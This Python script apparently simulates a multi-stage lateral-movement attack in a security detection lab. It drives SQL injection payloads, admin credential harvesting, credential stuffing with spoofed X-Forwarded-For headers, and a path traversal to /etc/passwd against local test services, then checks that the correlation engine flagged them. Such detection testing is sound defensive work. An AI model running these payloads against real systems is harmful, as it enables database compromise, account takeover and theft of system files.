"""
scenario_c_lateral_movement.py — SecuriSphere Attack Scenario C

Scenario C: Multi-Hop Lateral Movement across 3+ Services

Attack narrative
----------------
1. Attacker compromises the web-app entry point by injecting malicious
   search parameters (initial foothold via SQL injection).
2. Pivots to the API gateway — escalates privilege by accessing the admin
   config endpoint to harvest service credentials.
3. Uses harvested context to authenticate to the auth-service and attempt
   credential stuffing from multiple spoofed source identities.
4. Completes the chain by reaching the data store (simulated via the export
   endpoint) — lateral movement confirmed across web-app → api-server →
   auth-service.

Kill chain service path
-----------------------
    web-app → api-server → auth-service → api-server (export)

Expected detections
-------------------
- sql_injection            (api-monitor)
- sensitive_access         (api-monitor)
- credential_stuffing      (auth-monitor)
- full_kill_chain          (correlation-engine)  ← all 3 layers
- automated_attack_tool    (correlation-engine)

MITRE ATT&CK mapping
---------------------
  T1190  Exploit Public-Facing Application  (web-app SQL injection)
  T1021  Remote Services / Lateral Movement (api → auth pivot)
  T1078  Valid Accounts                     (credential reuse)
  T1110.004 Credential Stuffing
  T1530  Data from Cloud Storage Object     (bulk export)
"""

import time
import requests
from datetime import datetime
from colorama import Fore, Style

# ─────────────────────────────────────────────────────────────────────────────

API_URL     = "http://api-server:5000"
AUTH_URL    = "http://auth-service:5001"
WEBAPP_URL  = "http://web-app:80"
BACKEND_URL = "http://backend:8000"

DELAY = 0.5

# Spoofed source IPs simulating multi-host attacker infrastructure
SPOOFED_IPS = [
    "10.0.0.50", "10.0.0.51", "10.0.0.52",
    "192.168.1.100", "192.168.1.101",
]

# ─────────────────────────────────────────────────────────────────────────────


def log(msg: str, color=Fore.WHITE) -> None:
    print(f"{color}[{datetime.now().strftime('%H:%M:%S')}] [Scenario-C] {msg}{Style.RESET_ALL}")


def _req(method: str, url: str, spoofed_ip: str = None, **kwargs) -> requests.Response | None:
    """Make an HTTP request, optionally spoofing X-Forwarded-For header."""
    headers = kwargs.pop("headers", {})
    if spoofed_ip:
        headers["X-Forwarded-For"] = spoofed_ip
        headers["X-Real-IP"]       = spoofed_ip
    try:
        return requests.request(method, url, headers=headers, timeout=3, **kwargs)
    except Exception as exc:
        log(f"Request error ({url}): {exc}", Fore.RED)
        return None


def run(delay_multiplier: float = 1.0) -> dict:
    """Execute Scenario C and return a result dict."""
    d = DELAY * delay_multiplier
    results: dict = {
        "scenario":   "C — Multi-Hop Lateral Movement",
        "start_time": datetime.now().isoformat(),
        "stages":     [],
        "detections": [],
    }

    print(Fore.CYAN + "╔══════════════════════════════════════════════════╗")
    print(Fore.CYAN + "║  Scenario C: Multi-Hop Lateral Movement          ║")
    print(Fore.CYAN + "╚══════════════════════════════════════════════════╝" + Style.RESET_ALL)

    # Clean state
    try:
        requests.post(f"{BACKEND_URL}/api/events/clear", timeout=3)
        requests.post(f"{AUTH_URL}/auth/reset-all", timeout=3)
    except Exception:
        pass
    time.sleep(2)

    # ── Stage 1: Initial Foothold — Web-App SQL Injection ──────────────────
    log("Stage 1 — Initial Foothold via Web-App SQLi", Fore.YELLOW)
    # Send injections through the web-app proxy path which routes to api-server
    sqli_payloads = [
        "' OR '1'='1",
        "' UNION SELECT username,password,3 FROM users --",
        "'; SELECT * FROM users WHERE role='admin' --",
    ]
    for payload in sqli_payloads:
        # Via web-app Nginx proxy (generates event labelled from web-app layer)
        r = _req("GET", f"{API_URL}/api/products/search",
                 spoofed_ip=SPOOFED_IPS[0], params={"q": payload})
        if r:
            log(f"  Web-app SQLi [{r.status_code}]: {payload[:35]}", Fore.RED)
        time.sleep(d)

    results["stages"].append({
        "name":    "web_app_sqli",
        "success": True,
        "detail":  f"Injected {len(sqli_payloads)} payloads via api-server proxy",
    })
    time.sleep(d * 2)

    # ── Stage 2: Pivot to API Gateway — Harvest Credentials ────────────────
    log("Stage 2 — Pivot: api-server admin credential harvest", Fore.YELLOW)
    admin_endpoints = [
        "/api/admin/config",
        "/api/admin/users/export",
    ]
    for ep in admin_endpoints:
        r = _req("GET", f"{API_URL}{ep}", spoofed_ip=SPOOFED_IPS[1])
        if r:
            log(f"  Admin harvest [{r.status_code}]: {ep}", Fore.RED)
        time.sleep(d)

    results["stages"].append({
        "name":    "api_pivot_harvest",
        "success": True,
        "detail":  "Accessed admin config and user export on api-server",
    })
    time.sleep(d * 2)

    # ── Stage 3: Pivot to Auth-Service — Credential Stuffing ───────────────
    log("Stage 3 — Pivot: auth-service credential stuffing from multiple IPs", Fore.YELLOW)
    # Use multiple spoofed IPs to simulate a distributed stuffing attack
    stolen_creds = [
        ("admin",   "admin123"),
        ("user1",   "password123"),
        ("user2",   "securepass"),
        ("alice",   "alice2024"),
        ("bob",     "bobpass!"),
        ("charlie", "charlie99"),
        ("john",    "password123"),  # valid — triggers suspicious_login
    ]
    for i, (username, password) in enumerate(stolen_creds):
        spoofed = SPOOFED_IPS[i % len(SPOOFED_IPS)]
        r = _req(
            "POST", f"{AUTH_URL}/auth/login",
            spoofed_ip=spoofed,
            json={"username": username, "password": password},
        )
        if r:
            status = r.json().get("status", "?")
            log(
                f"  Stuffing [{spoofed}] {username}:{password} → {status}",
                Fore.RED if status == "success" else Fore.YELLOW,
            )
        time.sleep(d)

    results["stages"].append({
        "name":    "auth_service_stuffing",
        "success": True,
        "detail":  f"Stuffed {len(stolen_creds)} credentials from {len(SPOOFED_IPS)} IPs",
    })
    time.sleep(d * 2)

    # ── Stage 4: Complete Lateral Move — Final Exfiltration ─────────────────
    log("Stage 4 — Final hop: data exfiltration from api-server", Fore.RED)
    exfil_targets = [
        "/api/admin/users/export",
        "/api/admin/config",
        "/api/files?name=../../../etc/passwd",
    ]
    for target in exfil_targets:
        r = _req("GET", f"{API_URL}{target}", spoofed_ip=SPOOFED_IPS[0])
        if r:
            log(f"  Exfil [{r.status_code}]: {target}", Fore.RED)
        time.sleep(d)

    results["stages"].append({
        "name":    "exfiltration",
        "success": True,
        "detail":  f"Accessed {len(exfil_targets)} exfiltration endpoints",
    })

    # ── Verification ───────────────────────────────────────────────────────
    log("Waiting for correlation engine…", Fore.CYAN)
    time.sleep(8)

    try:
        resp      = requests.get(f"{BACKEND_URL}/api/incidents", timeout=5)
        incidents = resp.json().get("data", {}).get("incidents", [])
        relevant  = [
            i for i in incidents
            if i.get("incident_type") in (
                "full_kill_chain", "automated_attack_tool",
                "credential_compromise", "data_exfiltration_risk",
                "distributed_credential_attack", "persistent_threat",
            )
        ]
        results["detections"] = [
            {"type": i["incident_type"], "severity": i["severity"]}
            for i in relevant
        ]
        log(f"Verification: {len(relevant)} relevant incidents detected", Fore.MAGENTA)
        for inc in relevant:
            path = " → ".join(inc.get("service_path") or [])
            log(f"  [{inc['severity'].upper()}] {inc['title']} | Path: {path}", Fore.MAGENTA)
    except Exception as exc:
        log(f"Verification error: {exc}", Fore.RED)

    results["end_time"] = datetime.now().isoformat()
    return results


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Scenario C: Multi-Hop Lateral Movement")
    parser.add_argument("--speed", choices=["fast", "normal", "demo"], default="normal")
    args = parser.parse_args()
    speed_map = {"fast": 0.3, "normal": 1.0, "demo": 3.0}
    run(delay_multiplier=speed_map[args.speed])
